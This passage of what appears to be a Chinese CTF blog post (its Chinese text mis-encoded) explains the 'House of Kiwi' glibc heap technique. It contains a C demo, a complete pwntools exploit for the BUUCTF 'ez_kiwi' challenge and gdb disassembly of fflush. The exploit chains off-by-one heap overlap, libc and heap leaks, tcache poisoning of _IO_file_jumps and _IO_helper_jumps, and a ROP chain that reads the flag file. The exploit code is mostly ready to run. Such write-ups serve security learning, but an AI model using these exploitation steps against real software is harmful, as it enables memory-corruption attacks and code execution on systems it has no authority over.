class="hljs-string">&quot;LIBC:\t%#lx\n&quot;</span>,libc_base);<br><br>    <span class="hljs-type">size_t</span> magic_gadget = libc_base + <span class="hljs-number">0x53030</span> + <span class="hljs-number">61</span>; <span class="hljs-comment">// setcontext + 61</span><br>    <span class="hljs-type">size_t</span> IO_helper = libc_base + <span class="hljs-number">0x1E48C0</span>; <span class="hljs-comment">// _IO_hel</span><br>    per_jumps;<br>    <span class="hljs-type">size_t</span> SYNC = libc_base + <span class="hljs-number">0x1E5520</span>; <span class="hljs-comment">// sync pointer in _IO_file_jumps</span><br>    <span class="hljs-built_in">setROP</span>();<br>    *((<span class="hljs-type">size_t</span>*)IO_helper + <span class="hljs-number">0xA0</span>/<span class="hljs-number">8</span>) = ROP; <span class="hljs-comment">// è®¾ç½®rsp</span><br>    *((<span class="hljs-type">size_t</span>*)IO_helper + <span class="hljs-number">0xA8</span>/<span class="hljs-number">8</span>) = ret; <span class="hljs-comment">// è®¾ç½®rcx å³ ç¨‹åºsetcontextè¿è¡Œå®Œåä¼šé¦–å…ˆè°ƒç”¨çš„æŒ‡ä»¤åœ°å€</span><br>    *((<span class="hljs-type">size_t</span>*)SYNC) = magic_gadget; <span class="hljs-comment">// è®¾ç½®fflush(stderr)ä¸­è°ƒç”¨çš„æŒ‡ä»¤åœ°å€</span><br>    <span class="hljs-comment">// è§¦å‘assertæ–­è¨€,é€šè¿‡large bin chunkçš„sizeä¸­flagä½ä¿®æ”¹,æˆ–è€…top chunkçš„inuseå†™0ç­‰æ–¹æ³•å¯ä»¥è§¦å‘assert</span><br>    <span class="hljs-type">size_t</span> *top_size = (<span class="hljs-type">size_t</span>*)((<span class="hljs-type">char</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>) + <span class="hljs-number">0x18</span>);<br>    *top_size = (*top_size)&amp;<span class="hljs-number">0xFFE</span>; <span class="hljs-comment">// top_chunk sizeæ”¹å°å¹¶å°†inuseå†™0,å½“top chunkä¸è¶³çš„æ—¶å€™,ä¼šè¿›å…¥sysmallocä¸­,å…¶ä¸­æœ‰ä¸ªåˆ¤æ–­top_chunkçš„sizeä¸­inuseä½æ˜¯å¦å­˜åœ¨</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>); <span class="hljs-comment">// è§¦å‘assert</span><br>    _exit(<span class="hljs-number">-1</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="è°ƒè¯•å’Œä¾‹é¢˜"><a class="header-anchor" href="#è°ƒè¯•å’Œä¾‹é¢˜">Â¶</a>è°ƒè¯•å’Œä¾‹é¢˜</h4><p>ğŸ‘´ ç§è‡ªè®¤ä¸º <strong>kiwi ç®€æ´ä½†ä¸ç®€å•</strong>ï¼Œç®€æ´åˆ°ç®€å•æ”¹æ”¹ demo å°±èƒ½åœ¨å…¶ä»–çš„é¢˜ç›®é‡Œæ‰“ <strong>ROP</strong> ç»•æ²™ç®±ã€‚åˆä¸ç®€å•åˆ°å¿…é¡»<strong>è‡ªå·±è°ƒè¯•</strong>ï¼Œæ‰èƒ½è¾ƒå¥½åœ°æŒæ¡è¿™ä¸€åˆ©ç”¨è·¯çº¿ï¼Œäº†è§£å…¶ä¸­ç»†èŠ‚ï¼Œä»¥åå’Œå…¶ä»–æ–¹æ³•ç»“åˆèµ·æ¥æ‰èƒ½æ¯”è¾ƒä»å®¹ã€‚</p><h5 id="ez-kiwi"><a class="header-anchor" href="#ez-kiwi">Â¶</a>ez_kiwi</h5><p>å‡ºè‡ª BUUCTF çš„ <a href="https://buuoj.cn/match/matches/109/challenges#ez_kiwi">Dest0g3 520è¿æ–°èµ›</a></p><h6 id="åˆ†æ-v3"><a class="header-anchor" href="#åˆ†æ-v3">Â¶</a>åˆ†æ</h6><p>è¿™é¢˜æŒºé€‚åˆæ‹¿æ¥è°ƒè¯• kiwi çš„ï¼Œé¢˜ç›®ç»™äº†ä¸ªç®€å•çš„ off-by-one ï¼ŒğŸ‘´ è®¤ä¸º off-by-one æ˜¯éå¸¸ç™½ç»™çš„æ¼æ´æ‰€ä»¥ä¸ä¼šéš¾ã€‚</p><p>åŒæ—¶é¢˜ç›®æ²¡æœ‰ç»™æ˜¾å¼çš„ exit å¹¶ä¸”æ¯æ¬¡è¿›å…¥ menu å‰ä¼šæ¸…é™¤å‡ ä¸ª hook ï¼Œä¹Ÿæ˜¯è¦æ±‚æˆ‘ä»¬æ‰“ IO äº†ã€‚</p><p>ä½†æ˜¯å‡ºé¢˜äººè¿™æ¬¡æ‰€æœ‰çš„é¢˜ç›®éƒ½æ²¡æœ‰å¼€ sandbox ï¼Œè¿™æ˜¯ä¸ªå¤§ä¼ç¬”ï¼Œæš‚æŒ‰ä¸‹ä¸è¡¨ã€‚</p><h6 id="æ€è·¯-v3"><a class="header-anchor" href="#æ€è·¯-v3">Â¶</a>æ€è·¯</h6><ol><li>off-by-one æ‰“å †é‡å æ”¹ size æ‹¿åˆ°å¤§ chunk</li><li>Free å¤§ chunk å†æ‹¿å›æ¥ï¼Œåˆ©ç”¨æ®‹ç•™æŒ‡é’ˆç®€å•çš„ leak</li><li>åˆ©ç”¨é‡å å †å—é‡Œçš„ chunk æ„é€  Tcache Poisoning ä»»æ„å†™ï¼Œæ‰“ kiwi</li></ol><h6 id="Exp-v3"><a class="header-anchor" href="#Exp-v3">Â¶</a>Exp</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.31/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./ez_kiwi&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br>p = process(<span class="hljs-string">&#x27;./ez_kiwi&#x27;</span>)<br>debug()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">choice</span>):<br>    sla(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-built_in">str</span>(choice))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,<span class="hljs-built_in">id</span>,data=<span class="hljs-string">&#x27;u&#x27;</span></span>):<br>    menu(<span class="hljs-number">1</span>)<br>    sla(<span class="hljs-string">&#x27;How much do you want?&#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sla(<span class="hljs-string">&#x27;Which one do you want to put?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sea(<span class="hljs-string">&#x27;Tell me your idea:\n&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Which one do you want to remove?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;Which one do you want to look?\n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,data</span>):<br>    menu(<span class="hljs-number">4</span>)<br>    sla(<span class="hljs-string">&#x27;Which one do you want to change?&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sea(<span class="hljs-string">&#x27;Change your idea:&#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gift</span>():<br>    menu(<span class="hljs-number">666</span>)<br><br><span class="hljs-comment"># flag_addr = heap_base + 0x2a0</span><br>sla(<span class="hljs-string">&#x27;Before the game starts, please give me your name:\n&#x27;</span>,<span class="hljs-string">&#x27;./flag\0&#x27;</span>)<br><br><span class="hljs-comment"># Easy Heap Fengshui</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">0</span>) <span class="hljs-comment"># 0</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">1</span>) <span class="hljs-comment"># 1</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>) <span class="hljs-comment"># 2</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">3</span>) <span class="hljs-comment"># 3</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">4</span>) <span class="hljs-comment"># 4</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">5</span>) <span class="hljs-comment"># 5</span><br>add(<span class="hljs-number">0x100</span>,<span class="hljs-number">6</span>) <span class="hljs-comment"># 6</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">7</span>) <span class="hljs-comment"># 7</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">8</span>) <span class="hljs-comment"># 8</span><br><br><span class="hljs-comment"># chunk1 -&gt; size = 0x40</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span>+<span class="hljs-string">&#x27;\x41&#x27;</span>)<br>dele(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x38</span>,<span class="hljs-number">1</span>)<br><br><span class="hljs-comment"># chunk2 -&gt; size = 0x460 Create a unsortedbin</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span> + p64(<span class="hljs-number">0x20</span> + <span class="hljs-number">0x110</span>*<span class="hljs-number">4</span> + <span class="hljs-number">1</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>dele(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># Leak libc</span><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>show(<span class="hljs-number">2</span>)<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1ebf75</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br>libc = elf.libc<br>libc.address = libc_base<br><br>magic = libc.sym.setcontext + <span class="hljs-number">61</span><br>__sync = libc.sym._IO_file_jumps + <span class="hljs-number">0x60</span><br>_IO_helper_jumps = libc_base + <span class="hljs-number">0x1ec8a0</span><br><br>rax = libc_base + <span class="hljs-number">0x000000000004a550</span><br>rdi = libc_base + <span class="hljs-number">0x0000000000026b72</span><br>rsi = libc_base + <span class="hljs-number">0x0000000000027529</span><br>rdx_r12 = libc_base + <span class="hljs-number">0x000000000011c371</span><br>ret = rdi + <span class="hljs-number">1</span><br>syscall = libc_base + <span class="hljs-number">0x0000000000066229</span><br>read = libc.sym.read<br>write = libc.sym.write<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x000000000004a550 : pop rax ; ret</span><br><span class="hljs-string">0x0000000000026b72 : pop rdi ; ret</span><br><span class="hljs-string">0x000000000011c371 : pop rdx ; pop r12 ; ret</span><br><span class="hljs-string">0x0000000000027529 : pop rsi ; ret</span><br><span class="hljs-string">0x0000000000025679 : ret</span><br><span class="hljs-string">0x0000000000066229: syscall; ret;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-comment"># Leak heap</span><br>dele(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x11</span>)<br>show(<span class="hljs-number">2</span>)<br>ru(<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x10</span>)<br>heap_leak = uu64(rc(<span class="hljs-number">6</span>))<br>heap_base = (heap_leak&gt;&gt;<span class="hljs-number">12</span>)&lt;&lt;<span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br>flag_addr = heap_base + <span class="hljs-number">0x2a0</span><br>rop_addr = heap_base + <span class="hljs-number">0x440</span><br><br><span class="hljs-comment"># Prepare ROP</span><br>rop_chain = flat(<br>    <span class="hljs-comment">#   open(&#x27;./flag\0&#x27;)                                                 </span><br>    [rax,<span class="hljs-number">2</span>,rdi,flag_addr,rsi,<span class="hljs-number">0</span>,rdx_r12,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,syscall] + \<br>    <span class="hljs-comment">#   read(new_fd,flag_addr+0x10,0x50)</span><br>    [rdi,<span class="hljs-number">3</span>,rsi,flag_addr+<span class="hljs-number">0x10</span>,rdx_r12,<span class="hljs-number">0x50</span>,<span class="hljs-number">0</span>,read] + \<br>    <span class="hljs-comment">#   write(1,flag_addr+0x10,0x50)</span><br>    [rdi,<span class="hljs-number">1</span>,write] + [<span class="hljs-string">&#x27;\n&#x27;</span>]<br>)<br>edit(<span class="hljs-number">4</span>,rop_chain)<br><br><span class="hljs-comment"># Tcache Poisoning1 _IO_file_jumps -&gt; __sync = setcontext + 61</span><br>dele(<span class="hljs-number">7</span>)<br>dele(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p64(__sync) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">7</span>,p64(magic))<br><br><span class="hljs-comment"># Tcache Poisoning2 _IO_helper_jumps + 0xA0/0xA8</span><br>dele(<span class="hljs-number">0</span>)<br>dele(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p64(_IO_helper_jumps + <span class="hljs-number">0xA0</span>) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">0</span>,p64(rop_addr) + p64(ret))<br><br><span class="hljs-comment"># Tcache Poisoning3 topchunk -&gt; size </span><br>dele(<span class="hljs-number">8</span>)<br>dele(<span class="hljs-number">2</span>)<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;u&#x27;</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x21</span>)+p64(heap_base+<span class="hljs-number">0x7a0</span>) + p64(<span class="hljs-number">0</span>) + <span class="hljs-string">&#x27;\n&#x27;</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">0x18</span>,<span class="hljs-number">8</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># Trigger kiwi ~~</span><br>pause()<br>gift()<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h6 id="è°ƒè¯•-v3"><a class="header-anchor" href="#è°ƒè¯•-v3">Â¶</a>è°ƒè¯•</h6><p>ç®€å•çš„ off-by-one å°±ä¸æäº†ï¼Œä¸»è¦çœ‹ä¸€ä¸‹ä»»æ„å†™åå’‹è¿›å…¥çš„æˆ‘ä»¬ <strong>kiwi</strong> æµç¨‹ï¼Œåˆæ˜¯æ€ä¹ˆæ‰§è¡Œçš„ <strong>ROP</strong>ã€‚</p><p>åœ¨ gift() å‡½æ•°ä¸‹æ–­ç‚¹ï¼Œ<code>b malloc</code>ã€‚</p><p>å½“å…¶ä»–æ¡ä»¶ä¸æ»¡è¶³æ—¶æ¥åˆ° sysmalloc å‡†å¤‡ä» topchunk ä¸­åˆ†é…ï¼Œä½†ç”±äº topchunk å·²ç»è¢« ğŸ‘´ ğŸ‘ å®Œäº†ï¼Œæ‰€ä»¥ä¼šè¿›å…¥ <code>__malloc_assert</code>ã€‚</p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220526164931591.png" alt="image-20220526164931591" style="zoom:67%;" /><p>ç„¶åæˆ‘ä»¬çš„ä¸»è§’ <strong>fflush</strong> å°±ç™»åœºäº†ï¼Œè¿™é‡Œçš„ <strong>__fxprintf</strong> ä¹Ÿè¦çœ¼ç†Ÿä¸€ä¸‹( <strong>husk</strong> ä¼šè€ƒ)ï¼š</p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220526170141182.png" alt="image-20220526170141182" style="zoom:67%;" /><p>è¿™é‡Œæ˜¯é‡ç‚¹ï¼Œæˆ‘ä»¬å¿…é¡»ç»“åˆæ±‡ç¼–ä»£ç æ‰èƒ½ç©æ˜ç™½ç‚¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs asm">pwndbg&gt; x/40i &amp;fflush<br>   0x7ffff7e5a4c0 &lt;fflush&gt;:     endbr64<br>   0x7ffff7e5a4c4 &lt;fflush+4&gt;:   test   rdi,rdi<br>   0x7ffff7e5a4c7 &lt;fflush+7&gt;:   je     0x7ffff7e5a590 &lt;fflush+208&gt;<br>   0x7ffff7e5a4cd &lt;fflush+13&gt;:  push   rbp<br>   0x7ffff7e5a4ce &lt;fflush+14&gt;:  push   rbx<br>   0x7ffff7e5a4cf &lt;fflush+15&gt;:  mov    rbx,rdi<br>   0x7ffff7e5a4d2 &lt;fflush+18&gt;:  sub    rsp,0x8<br>   0x7ffff7e5a4d6 &lt;fflush+22&gt;:  mov    edx,DWORD PTR [rdi]<br>   0x7ffff7e5a4d8 &lt;fflush+24&gt;:  and    edx,0x8000<br>   0x7ffff7e5a4de &lt;fflush+30&gt;:  jne    0x7ffff7e5a51d &lt;fflush+93&gt;<br>   0x7ffff7e5a4e0 &lt;fflush+32&gt;:  mov    rdi,QWORD PTR [rdi+0x88]<br>   0x7ffff7e5a4e7 &lt;fflush+39&gt;:  mov    rbp,QWORD PTR fs:0x10<br>   0x7ffff7e5a4f0 &lt;fflush+48&gt;:  cmp    QWORD PTR [rdi+0x8],rbp<br>   0x7ffff7e5a4f4 &lt;fflush+52&gt;:  je     0x7ffff7e5a519 &lt;fflush+89&gt;<br>   0x7ffff7e5a4f6 &lt;fflush+54&gt;:  mov    eax,DWORD PTR fs:0x18<br>   0x7ffff7e5a4fe &lt;fflush+62&gt;:  test   eax,eax<br>   0x7ffff7e5a500 &lt;fflush+64&gt;:  jne    0x7ffff7e5a5a0 &lt;fflush+224&gt;<br>   0x7ffff7e5a506 &lt;fflush+70&gt;:  mov    edx,0x1<br>   0x7ffff7e5a50b &lt;fflush+75&gt;:  cmpxchg DWORD PTR [rdi],edx<br>   0x7ffff7e5a50e &lt;fflush+78&gt;:  mov    rdi,QWORD PTR [rbx+0x88]<br>   0x7ffff7e5a515 &lt;fflush+85&gt;:  mov    QWORD PTR [rdi+0x8],rbp<br>   0x7ffff7e5a519 &lt;fflush+89&gt;:  add    DWORD PTR [rdi+0x4],0x1<br>   0x7ffff7e5a51d &lt;fflush+93&gt;:  mov    rbp,QWORD PTR [rbx+0xd8]<br>   0x7ffff7e5a524 &lt;fflush+100&gt;: lea    rdx,[rip+0x167375]        # 0x7ffff7fc18a0 &lt;_IO_helper_jumps&gt;<br>   0x7ffff7e5a52b &lt;fflush+107&gt;: lea    rax,[rip+0x1680d6]        # 0x7ffff7fc2608 &lt;__elf_set___libc_atexit_element__IO_cleanup__&gt;<br>   0x7ffff7e5a532 &lt;fflush+114&gt;: sub    rax,rdx<br>   0x7ffff7e5a535 &lt;fflush+117&gt;: mov    rsi,rbp<br>   0x7ffff7e5a538 &lt;fflush+120&gt;: sub    rsi,rdx<br>   0x7ffff7e5a53b &lt;fflush+123&gt;: cmp    rax,rsi<br>   0x7ffff7e5a53e &lt;fflush+126&gt;: jbe    0x7ffff7e5a598 &lt;fflush+216&gt;<br>   0x7ffff7e5a540 &lt;fflush+128&gt;: mov    rdi,rbx<br>=&gt; 0x7ffff7e5a543 &lt;fflush+131&gt;: call   QWORD PTR [rbp+0x60]<br></code></pre></td></tr></table></figure><p>å¥½çš„ï¼Œæ¯”è¾ƒå…³é”®çš„å‡ ä¸ªç‚¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">0x7ffff7e5a4cf &lt;fflush+15&gt;:  mov    rbx,rdi# rbx = stderr<br>#0x7ffff7e5a50e &lt;fflush+78&gt;:  mov    rdi,QWORD PTR [rbx+0x88] rdi = [stderr + 0x88] = _IO_stdfile_2_lock<br><br>0x7ffff7e5a51d &lt;fflush+93&gt;:  mov    rbp,QWORD PTR [rbx+0xd8] # rbp = [stderr + 0xd8] = _IO_file_jumps<br>0x7ffff7e5a524 &lt;fflush+100&gt;: lea    rdx,[rip+0x167375]        # 0x7ffff7fc18a0 &lt;_IO_helper_jumps&gt;<br>0x7ffff7e5a543 &lt;fflush+131&gt;: call   QWORD PTR [rbp+0x60]# call [_IO_helper_jumps + 0x60] &lt;-&gt; call __sync<br></code></pre></td></tr></table></figure><p>å¯ä»¥å‘ç°æˆ‘ä»¬çš„ <strong>rdx = _IO_helper_jumps</strong>ï¼Œè€Œé«˜ç‰ˆæœ¬çš„ setcontext åˆæ˜¯ç”± rdx æ§åˆ¶ï¼š</p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/links/image-20220526174433379.png" alt="image-20220526174433379" style="zoom:67%;" /><p>é‚£ä¹ˆæˆ‘ä»¬åœ¨ <code>_IO_helper_jumps + 0xA0</code> å¸ƒç½®çš„ <code>rsp = rop_chain 